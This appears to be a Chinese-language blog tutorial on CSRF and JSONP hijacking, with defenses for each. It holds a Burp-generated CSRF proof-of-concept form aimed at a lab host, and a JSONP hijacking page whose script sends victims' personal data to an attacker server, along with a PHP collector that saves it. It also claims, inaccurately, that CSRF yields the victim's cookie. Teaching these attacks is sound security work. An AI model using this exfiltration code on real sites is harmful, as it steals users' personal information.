---
layout: post
title: web常见漏洞二
categories: 网络安全
description: web常见漏洞二
keywords: web常见漏洞,CSRF,JSONP,SSRF,反序列化
---

web常见漏洞：CSRF,JSONP,CORS,SSRF,反序列化等

### 1、CSRF漏洞

CSRF 定义： 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者session riding，通常缩写为 CSRF ， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。

简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

csrf 漏洞攻击原理

1. 用户打开浏览器，访问登陆受信任的 A 网站
2. 在用户信息通过验证后，服务器会返回一个 cookie 给浏览器，用户登陆网站 A 成功，可以正常发送请求到网站 A
3. 用户未退出网站 A，在同一浏览器中，打开一个危险网站 B
4. 网站 B 收到用户请求后，返回一些恶意代码，并发出请求要求访问网站 A
5. 浏览器收到这些恶意代码以后，在用户不知情的情况下，利用 cookie 信息，向网站 A 发送恶意请求，网站A 会根据 cookie 信息以用户的权限去处理该请求，导致来自网站 B 的恶意代码被执行

#### 1.1 csrf攻击

攻击方式有两种：

1. 受害者登录网站后，没有退出的情况下，访问网站 b 触发
2. 在存在漏洞的网站，挖掘 xss 漏洞，自动调用这 poc.html

第一种攻击方式使用burp suite抓包，然后右键 =》`engagementtools` =》`generate CSRF PoC`，在弹出的页面内点击`COPY HTML`，然后新建一个html文件，把复制的放进去。

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.3.16/06/vul/csrf/csrfget/csrf_get_edit.php">
      <input type="hidden" name="sex" value="1" />
      <input type="hidden" name="phonenum" value="1" />
      <input type="hidden" name="add" value="1" />
      <input type="hidden" name="email" value="1" />
      <input type="hidden" name="submit" value="submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

这个就是伪造的B页面了，当被攻击者点击提交(正常攻击大概率不会是点击事件，而是直接请求一个payload)，然后就拿到了被攻击者的cookie，然后我们就可以篡改他要修改的内容为我们定义的内容了，甚至可以直接取代他，成为他。

#### 1.2 CSRF  防御方案

CSRF现在已经比较少了，防御办法也很简单

1. 增加 Token 验证（常用做法）：对关键操作增加 Token 参数，token 必须随机，每次都不一样
2. 关于安全的会话管理（避免会话被利用）：
   1. 不要在客户端保存敏感信息（比如身份验证信息）
   2. 退出、关闭浏览器时的会话过期机制
   3. 设置会话过机制，比如 15 分钟无操作，则自动登录超时
3. 访问控制安全管理：
   1. 敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码
   2. 敏感信息的修改使用 POST，而不是 GET
   3. 通过 HTTP 头部中的 REFERER 来限制原页面
4. 增加验证码：一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）

### 2、jsonp漏洞

Jsonp(JSON with Padding) 是 json 的一种"使用模式"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。

攻击者模拟用户向有漏洞的服务器发送 JSONP 请求，然后就获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务。

jSONP 的最基本的原理是：动态添加一个< script >标签，而 script 标签的 src 属性是没有跨域的限制的。由于同源策略的限制，XmlHttpRequest 只允许请求当前源(域名、协议、端口都相同)的资源，如果要进行跨域请求， 我们可以通过使用 html 的 script 标记来进行跨域请求，并在响应中返回要执行的 script 代码，其中可以直接使用 JSON 传递 javascript 对象。

考虑这样一种情况，存在两个网站 A 和 B，网站A是黑客构建的一个网站，网站B是一个正常的网站，用户在网站 B 上注册并且填写了自己的用户名，手机号，身份证号等信息，并且网站 B 存在一个 jsonp 接口，用户在访问网站 B 的时候。这个 jsonp 接口会返回用户的个人信息，并在网站 B 的 html 页面上进行显示。如果网站 B 对此 jsonp 接口的来源验证存在漏洞，那么当用户访问网站 A 时，网站 A 便可以利用此漏洞进行 JSONP 劫持来获取用户的信息。

攻击方法与 csrf 类似，都是需要用户登录帐号，身份认证还没有被消除的情况下访问攻击者精心设计好的的页面。就会获取 json 数据，把 json 数据发送给攻击者。寻找敏感 json 数据 api 接口，构造恶意的代码。发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器。

demo服务端代码：

```php
<?php
header('Content-type: application/json');
$callback = $_GET['callback'];
print $callback.'({"id":"1","name":"test"})';
?>
```

demoHTML页面代码

```html
<script>
function jsonp2(data){
    alert(JSON.stringify(data));
}
</script>
<script src="http:target.com/user.php?callback=jsonp2"></script>
```

构建攻击：

服务端代码：

```php
<?php
if($_GET['file']){
	file_put_contents('json.txt',$_GET['file']);
}
?>
```

jsonp劫持代码

```html
<script>
function test(data){
    var xmlhttp = new XMLHttpRequest();
    // 获取到数据，然后发送到自己的服务端
    var url = "http://www.myserver.com/1.php?file=" + JSON.stringify(data);
    xmlhttp.open("GET",url,true);
    xmlhttp.send();
}
</script>
<!--www.target.com 原本的服务端的地址，只是控制了jsonp的变量名 原本为jsonp2，修改为test，test为自己构建的代码 -->
<script src="http://www.target.com/user.php?callback=test"></script>
```

当受害人登入构建的网站之后 访问这个页面时，会自动把接口 user.php 的敏感信息发送到远程服务器上，如果获取到信息就会在远程服务器上生成 json.txt。

#### 2.1 jsonp防御

json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 xmlhttp 的方式作为数据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据，如果是跨域的数据传输，必须要对敏感的数据获取做权限认证。
